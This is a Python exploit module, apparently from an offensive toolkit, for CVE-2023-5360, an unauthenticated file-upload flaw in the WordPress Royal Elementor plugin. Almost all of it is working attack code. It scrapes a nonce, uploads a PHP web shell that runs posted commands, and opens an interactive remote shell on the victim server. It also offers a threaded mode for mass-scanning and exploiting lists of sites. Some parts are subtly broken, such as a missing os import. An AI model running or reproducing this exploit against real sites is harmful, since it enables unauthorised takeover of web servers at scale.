import re
import json
import random
import string
import requests

from modules.io import *
from core.modular import Module
from alive_progress import alive_bar
from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.history import InMemoryHistory
from concurrent.futures import ThreadPoolExecutor, as_completed


class Exploit(Module):
    """
    Exploit for Remote Code Execution (RCE) Vulnerability in WordPress's Royal Elementor Plugin (versions < 1.3.79).

    A vulnerability in the Royal Elementor plugin allows for unauthenticated attackers to execute arbitrary code on the system.
    This is due to inadequate file type checking mechanisms in the plugin.
    By uploading specially crafted files, attackers can exploit this vulnerability to execute arbitrary code or create administrator accounts.

    Affected Versions: Royal Elementor versions less than 1.3.79.
    """

    def __init__(self):
        """
        Initializes the exploit with default settings and necessary configurations.
        Sets up a requests session with default headers and disables SSL warnings
        to avoid unnecessary messages during HTTPS connections.
        """

        super().__init__()
        self.name = "CVE-2023-5360"
        self.description = "RCE on WordPress's Royal Elementor (< 1.3.79)"
        self.author = "Chocapikk"
        self.creation_date = "18-11-2023"

        self.session = requests.Session()
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
        }
        self.verbose = False
        self.custom_file = None
        self.default_webshell = (
            '<?php echo "[S]"; passthru($_POST["cmd"]); echo "[E]";?>'
        )
        self.output_file = None
        self.timeout = 10
        self.threads = 50
        self.url = None

        requests.packages.urllib3.disable_warnings(
            requests.packages.urllib3.exceptions.InsecureRequestWarning
        )

    def execute(self):
        """
        Executes the exploit based on user input. Allows for either single URL ('url' mode)
        or mass scanning ('mass' mode). In 'url' mode, it also allows for specifying a custom PHP file.
        """

        mode = input_data(self.name, "Choose mode (url/mass):")

        if mode == "url":
            self.verbose = (
                input_data(self.name, "Enable verbose mode? (yes/no)") == "yes"
            )
            self.custom_file = input_data(
                self.name,
                "Enter the path to a custom PHP file (leave blank for default webshell):",
            )
            if not self.custom_file:
                self.custom_file = self.default_webshell

            url = input_data(self.name, "Enter the URL to scan:")
            self.url = url
            self.check_vulnerability(self.url)

        elif mode == "mass":
            self.handle_mass_scan()

        else:
            print_error("Invalid mode selected. Please choose 'url' or 'mass'.")

    def _write_output(self, url):
        """
        Writes the provided URL to the output file if an output file is specified.
        This function is used to log the URLs that are found to be vulnerable.

        :param url: The URL to be written to the output file.
        """

        if self.output_file:
            with open(self.output_file, "a") as file:
                file.write(url + "\n")

    def _get_nonce(self, url):
        """
        Retrieves a security nonce from the given URL, if available.
        The nonce is needed for certain requests to the Royal Elementor plugin for authentication.

        :param url: The target site URL from which to retrieve the nonce.
        :return: The retrieved nonce, or None if no nonce is found.
        """

        response, _ = self._make_request(url)
        match = re.search("var\s+WprConfig\s*=\s*({.*?});", response.text)
        if match:
            nonce_json = json.loads(match.group(1))
            return nonce_json.get("nonce")
        return None

    def _make_request(self, url, nonce=None, include_default_webshell=True):
        """
        Makes a request to the given URL. If a nonce is provided, it constructs a payload
        for file upload exploiting the vulnerability. If the custom_file is not specified,
        it uses the default webshell as part of the payload.

        :param url: The target URL for making the request.
        :param nonce: The nonce required for making an authenticated request.
        :param include_default_webshell: Boolean to decide if the default webshell should be included.
        :return: The response object and a new nonce if generated.
        """

        response = None
        try:
            new_nonce = None

            if nonce:
                new_nonce = "".join(
                    random.choices(string.ascii_letters + string.digits, k=10)
                )

                try:
                    with open(self.custom_file, "rb") as f:
                        file_content = f.read()
                    if self.verbose:
                        print_status(
                            f"Sending request with payload from file: {self.custom_file}"
                        )
                except:
                    random_content = '<?php echo "' + new_nonce + '"; ?>'
                    file_content = random_content.encode("utf-8")

                    if include_default_webshell:
                        file_content += b"\n" + self.default_webshell.encode("utf-8")

                    if self.verbose:
                        print_status(f"Sending request with payload: {file_content}")

                files = {"uploaded_file": ("poc.ph$p", file_content)}
                data = {
                    "action": "wpr_addons_upload_file",
                    "max_file_size": 0,
                    "allowed_file_types": "ph$p",
                    "triggering_event": "click",
                    "wpr_addons_nonce": nonce,
                }
                response = self.session.post(
                    url,
                    headers=self.headers,
                    files=files,
                    data=data,
                    verify=False,
                    timeout=self.timeout,
                )
            else:
                response = self.session.get(
                    url, headers=self.headers, verify=False, timeout=self.timeout
                )

            return response, new_nonce

        except requests.exceptions.RequestException as e:
            if self.verbose:
                print_error(f"Request error for {url}: {e}")

        finally:
            if response:
                response.close()

        return None, None

    def plugin_exists(self, url):
        """
        Checks if the Royal Elementor plugin exists at the given URL.
        This is done by checking for the presence of the plugin's readme file.

        :param url: The URL where the plugin's existence needs to be checked.
        :return: True if the plugin exists, False otherwise.
        """

        readme_url = f"{url}/wp-content/plugins/royal-elementor-addons/readme.txt"
        response, _ = self._make_request(readme_url)
        if response and response.status_code == 200:
            return "royal-elementor-addons" in response.text
        return False

    def interactive_shell(self, shell_url):
        """
        Provides an interactive shell to the user for executing commands on the target system.
        This function is invoked after a successful exploitation, allowing command execution via the uploaded shell.

        :param shell_url: The URL of the uploaded shell for command execution.
        """

        session = PromptSession()
        while True:
            try:
                command = session.prompt(HTML("<ansired><b># </b></ansired>"))
                if "exit" in command.lower():
                    raise KeyboardInterrupt
                elif not command:
                    continue
                elif "clear" in command.lower():
                    os.system("clear" if os.name == "posix" else "cls")
                    continue

                payload = {"cmd": command}
                try:
                    response = requests.post(
                        shell_url, data=payload, timeout=self.timeout
                    )
                    output_match = re.search(
                        r"\[S\](.*)\[E\]", response.text, re.DOTALL
                    )

                    if output_match:
                        print_status(f"\n\n{output_match.group(1)}")
                    else:
                        print_error(
                            "No output, maybe disable_functions is activated or wrong command."
                        )

                except RequestException as e:
                    print_error(f"Error executing command: {e}")

            except KeyboardInterrupt:
                print_info("Exiting shell...")
                break

    def check_vulnerability(self, url):
        """
        Checks the specified URL for the Royal Elementor plugin vulnerability.
        Verifies plugin existence, retrieves a nonce, and attempts to exploit the vulnerability.
        If successful, allows for further interaction or logs the success.

        :param url: The URL to check for vulnerability.
        :return: True if the vulnerability is successfully exploited, False otherwise.
        """

        try:
            if not self.plugin_exists(url):
                if self.verbose:
                    print_error(
                        f"Plugin 'royal-elementor-addons' not found at {url}. Skipping..."
                    )
                return False

            if self.verbose:
                print_status(f"Scanning {url}")

            nonce = self._get_nonce(url)

            if nonce:
                print_info(f"Nonce found: {nonce}") if self.verbose else None
                ajax_url = f"{url}/wp-admin/admin-ajax.php"
                response, new_nonce = self._make_request(
                    ajax_url, nonce, include_default_webshell=url
                )

                if response is None:
                    print_error(
                        f"No response received for {url}"
                    ) if self.verbose else None
                    return False

                print_status(
                    f"Sent request to {ajax_url} with nonce: {nonce}"
                ) if self.verbose else None

                try:
                    json_response = json.loads(response.text)
                except json.JSONDecodeError:
                    print_error(
                        f"Unexpected server response for {url}. Not vulnerable."
                    ) if self.verbose else None
                    return False

                if json_response and json_response.get("success"):
                    shell_url = json_response["data"]["url"]
                    shell_response = self.session.get(shell_url, timeout=self.timeout)
                    self._write_output(shell_url)
                    print_success(f"CVE-2023-5360 detected for {url}")
                    if self.url:
                        self.interactive_shell(shell_url)
                    return True

                else:
                    print_error(f"No nonce found for {url}") if self.verbose else None

        except Exception as e:
            print_error(
                f"Error during vulnerability check for {url}: {e}"
            ) if self.verbose else None
        return False

    def handle_mass_scan(self):
        """
        Handles the mass scanning of URLs for the vulnerability. Reads URLs from a specified file
        and utilizes multi-threading to scan each URL concurrently.

        """

        url_list = input_data(self.name, "Enter the path to the file with URLs:")
        try:
            with open(url_list, "r") as file:
                urls = [url.strip() for url in file.readlines()]
        except FileNotFoundError:
            print_error(f"File not found: {url_list}")
            return

        with ThreadPoolExecutor(max_workers=self.threads) as executor, alive_bar(
            len(urls), bar="smooth", enrich_print=False
        ) as bar:
            futures = {
                executor.submit(self.check_vulnerability, url): url for url in urls
            }
            for future in as_completed(futures):
                result = future.result()
                bar()
